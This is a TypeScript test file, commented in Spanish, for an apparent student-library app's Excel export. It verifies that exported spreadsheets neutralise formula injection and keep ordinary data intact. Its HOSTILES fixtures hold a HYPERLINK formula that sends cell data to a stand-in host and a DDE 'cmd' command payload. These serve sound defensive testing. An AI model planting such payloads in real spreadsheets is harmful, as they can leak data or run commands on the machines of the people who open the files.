// ╔══════════════════════════════════════════════════════╗
// ║  export.service.spec.ts — Stenbrary v3.62.0          ║
// ║                                                      ║
// ║  Genera los .xlsx reales (visitas y alumnos) con     ║
// ║  textos hostiles y los inspecciona por dentro: el    ║
// ║  XML de cada hoja no tiene ni una fórmula (<f>), las ║
// ║  celdas hostiles son texto y llevan el apóstrofo, y  ║
// ║  los datos normales (matrículas, nombres, fechas,    ║
// ║  números) salen exactamente igual que antes.         ║
// ╚══════════════════════════════════════════════════════╝

import * as XLSX from 'xlsx';
import { unzipSync, strFromU8 } from 'fflate';
import { ExportService } from './export.service';
import { Alumno, Registro } from '../models';

const NBSP = String.fromCharCode(0xa0);
const IGUAL_ANCHO = String.fromCharCode(0xff1d); // ＝

const HOSTILES = {
  nombre: '=HYPERLINK("http://ejemplo.invalid/?d="&A1,"clic")',
  carrera: "+cmd|' /C calc'!A0",
  actividad: '@SUM(1,2)',
  apellido: '-2+3',
  grupo: '\t=1+1',
  turno: `${NBSP}=1+1`,
  extra: `${IGUAL_ANCHO}1+1`,
};

const FECHA = new Date(2026, 8, 2, 10, 5);
const SALIDA = new Date(2026, 8, 2, 11, 35);

const registro = (extra: Partial<Registro> = {}): Registro => ({
  id: 'r1', alumnoId: 'a1', matricula: '2299990001', nombreCompleto: 'José Pérez-López',
  carrera: 'Lic. en Derecho', motivoId: 'm1', motivoNombre: 'Estudiar',
  motivoIds: ['m1', 'm2'], motivoNombres: ['Estudiar', 'Investigación'],
  fechaHora: FECHA, horaSalida: SALIDA, duracionMinutos: 90, turno: 'Matutino', sincronizado: false,
  ...extra,
} as Registro);

const alumno = (extra: Partial<Alumno> = {}): Alumno => ({
  id: 'a1', matricula: '2299990001', nombre: 'Ana María', apellidoPaterno: 'Pérez-López',
  apellidoMaterno: '', carrera: 'Lic. en Derecho', grado: 3, grupo: 'A', turno: 'Matutino',
  activo: true, fechaRegistro: FECHA,
  ...extra,
} as Alumno);

/** Escribe el libro como .xlsx real y devuelve el XML de cada hoja y el libro releído. */
function generar(wb: XLSX.WorkBook): { xmlHojas: string[]; releido: XLSX.WorkBook } {
  const bytes = new Uint8Array(XLSX.write(wb, { type: 'array', bookType: 'xlsx', compression: true }) as ArrayBuffer);
  const zip = unzipSync(bytes);
  const xmlHojas = Object.keys(zip).filter(k => /^xl\/worksheets\/sheet\d+\.xml$/.test(k)).map(k => strFromU8(zip[k]));
  const releido = XLSX.read(bytes, { type: 'array', cellFormula: true });
  return { xmlHojas, releido };
}

/** Celdas de la primera hoja como { 'Encabezado': celda } por fila de datos. */
function filas(wb: XLSX.WorkBook): Record<string, XLSX.CellObject>[] {
  const ws = wb.Sheets[wb.SheetNames[0]];
  const rango = XLSX.utils.decode_range(ws['!ref']!);
  const enc: string[] = [];
  for (let c = rango.s.c; c <= rango.e.c; c++) enc.push(String(ws[XLSX.utils.encode_cell({ r: 0, c })]?.v));
  const out: Record<string, XLSX.CellObject>[] = [];
  for (let r = 1; r <= rango.e.r; r++) {
    const fila: Record<string, XLSX.CellObject> = {};
    enc.forEach((h, i) => { fila[h] = ws[XLSX.utils.encode_cell({ r, c: rango.s.c + i })]; });
    out.push(fila);
  }
  return out;
}

function sinFormulas(xmlHojas: string[], wb: XLSX.WorkBook): void {
  expect(xmlHojas.length).toBeGreaterThan(0);
  for (const xml of xmlHojas) expect(xml).not.toMatch(/<f[ >]/);
  for (const nombre of wb.SheetNames) {
    for (const [ref, celda] of Object.entries(wb.Sheets[nombre])) {
      if (ref.startsWith('!')) continue;
      expect((celda as XLSX.CellObject).f).withContext(`${nombre}!${ref}`).toBeUndefined();
    }
  }
}

describe('ExportService — los .xlsx no pueden ejecutar fórmulas', () => {
  const svc = new ExportService();

  it('visitas: textos hostiles quedan como texto con apóstrofo y el archivo no tiene fórmulas', () => {
    const wb = svc.libroRegistros(XLSX, [registro({
      nombreCompleto: HOSTILES.nombre, carrera: HOSTILES.carrera,
      motivoNombres: [HOSTILES.actividad, 'Estudiar'], turno: HOSTILES.turno as Registro['turno'],
    })]);
    const { xmlHojas, releido } = generar(wb);
    sinFormulas(xmlHojas, releido);

    const [f] = filas(releido);
    expect(f['Alumno'].t).toBe('s');
    expect(f['Alumno'].v).toBe(`'${HOSTILES.nombre}`);
    expect(f['Carrera'].v).toBe(`'${HOSTILES.carrera}`);
    expect(f['Actividades'].v).toBe(`'${HOSTILES.actividad}, Estudiar`);
    expect(f['Turno'].v).toBe(`'${HOSTILES.turno}`);
  });

  it('visitas: los datos normales salen igual (matrícula como texto, fecha, hora, número)', () => {
    const { xmlHojas, releido } = generar(svc.libroRegistros(XLSX, [registro()]));
    sinFormulas(xmlHojas, releido);
    const [f] = filas(releido);
    expect([f['Matrícula'].t, f['Matrícula'].v]).toEqual(['s', '2299990001']);
    expect(f['Alumno'].v).toBe('José Pérez-López');
    expect(f['Carrera'].v).toBe('Lic. en Derecho');
    expect(f['Actividades'].v).toBe('Estudiar, Investigación');
    expect(f['Fecha'].v).toBe(new Intl.DateTimeFormat('es-MX').format(FECHA));
    expect(f['Hora'].v).toBe(new Intl.DateTimeFormat('es-MX', { hour: '2-digit', minute: '2-digit' }).format(FECHA));
    expect([f['Duración (min)'].t, f['Duración (min)'].v]).toEqual(['n', 90]);
    expect(f['Turno'].v).toBe('Matutino');
  });

  it('alumnos (y columnas extra de Inactivos): hostiles neutralizados, normales intactos, números como número', () => {
    const wb = svc.libroAlumnos(XLSX, [
      alumno({ nombre: HOSTILES.nombre, apellidoPaterno: HOSTILES.apellido, grupo: HOSTILES.grupo }),
      alumno({ id: 'a2', matricula: '2299990002' }),
    ], a => a.id === 'a1'
      ? { 'Última visita': HOSTILES.extra, 'Días sin venir': 12 }
      : { 'Última visita': 'Nunca', 'Días sin venir': '—' });
    const { xmlHojas, releido } = generar(wb);
    sinFormulas(xmlHojas, releido);

    const [hostil, normal] = filas(releido);
    expect(hostil['Nombre'].v).toBe(`'${HOSTILES.nombre}`);
    expect(hostil['Apellido Paterno'].v).toBe(`'${HOSTILES.apellido}`);
    expect(hostil['Grupo'].v).toBe(`'${HOSTILES.grupo}`);
    expect(hostil['Última visita'].v).toBe(`'${HOSTILES.extra}`);
    expect([hostil['Días sin venir'].t, hostil['Días sin venir'].v]).toEqual(['n', 12]);
    expect([hostil['Grado'].t, hostil['Grado'].v]).toEqual(['n', 3]);

    expect([normal['Matrícula'].t, normal['Matrícula'].v]).toEqual(['s', '2299990002']);
    expect(normal['Nombre'].v).toBe('Ana María');
    expect(normal['Apellido Paterno'].v).toBe('Pérez-López');
    expect(normal['Grupo'].v).toBe('A');
    expect(normal['Activo'].v).toBe('Sí');
    expect(normal['Fecha Registro'].v).toBe(new Intl.DateTimeFormat('es-MX').format(FECHA));
    expect(normal['Última visita'].v).toBe('Nunca');
    expect(normal['Días sin venir'].v).toBe('—');
  });

  it('lo guardado no cambia: la neutralización es solo en la salida', () => {
    const r = registro({ nombreCompleto: HOSTILES.nombre });
    svc.libroRegistros(XLSX, [r]);
    expect(r.nombreCompleto).toBe(HOSTILES.nombre);
  });
});
